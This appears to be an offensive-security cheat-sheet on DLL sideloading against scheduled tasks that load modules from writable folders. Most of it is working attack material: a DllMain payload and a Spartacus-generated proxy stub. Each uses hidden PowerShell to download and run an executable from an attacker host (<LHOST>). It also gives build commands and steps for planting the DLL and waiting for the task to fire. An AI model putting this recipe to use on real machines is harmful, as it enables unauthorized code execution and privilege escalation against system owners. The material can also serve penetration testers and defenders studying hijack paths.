# DLL Sideloading via Writable Module Path

A custom tool (often run by a scheduled task as a higher-privileged user) that loads a DLL from a writable directory — e.g. its own `modules\` folder next to the exe — can be hijacked by dropping a malicious DLL with the exact expected name/path.

```c
// DllMain, runs on load — keep it minimal, just drop into a legit process
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("powershell -c \"iwr http://<LHOST>/stager.exe -o $env:APPDATA\\s.exe; & $env:APPDATA\\s.exe\"");
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc -shared poc.c -o <expected-dll-name>.dll
```
Confirm the expected DLL name/path first (decompile the loader with ILSpy/dnSpy for a .NET exe, or `strings`/Procmon for native), then drop it into the writable module directory and wait for the scheduled task to fire.

---

**Spartacus + Procmon: auto-identify hijackable DLLs and generate a proxy stub**

Run on a Windows analysis machine with the target exe, Procmon, and Spartacus:
```cmd
.\Spartacus.exe --mode dll --procmon .\Procmon.exe ^
    --pml C:\tmp\logs.pml ^
    --csv C:\tmp\VulnerableDLLFiles.csv ^
    --solution C:\tmp\Solutions ^
    --verbose
REM then launch the target exe, let it run, press Enter to stop Procmon
```
Spartacus captures Procmon's DLL load events, filters for `NAME NOT FOUND` results in writable paths, and emits a Visual Studio `.sln` per candidate with export-forwarding pragmas already filled in.

Open the generated `.cpp`, add your payload to `PayloadThread`, keep the pragma and `LoadLibrary` lines untouched:
```cpp
#pragma comment(linker,"/export:RealFunc=C:\\Windows\\System32\\Target.RealFunc,@1")
HMODULE hReal = LoadLibrary(L"C:\\Windows\\System32\\Target.dll");

DWORD WINAPI PayloadThread(LPVOID) {
    // payload here — use CreateProcessW instead of system() to avoid a console flash
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wchar_t cmd[] = L"powershell -WindowStyle Hidden -Command \"IWR http://<LHOST>/s.exe -OutFile C:\\Windows\\Temp\\s.exe; Start-Process C:\\Windows\\Temp\\s.exe\"";
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH) CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    return TRUE;
}
```
Build with Visual Studio (x64 Release), plant the compiled `.dll` in the writable path next to the target exe and wait for the user/task to launch it.
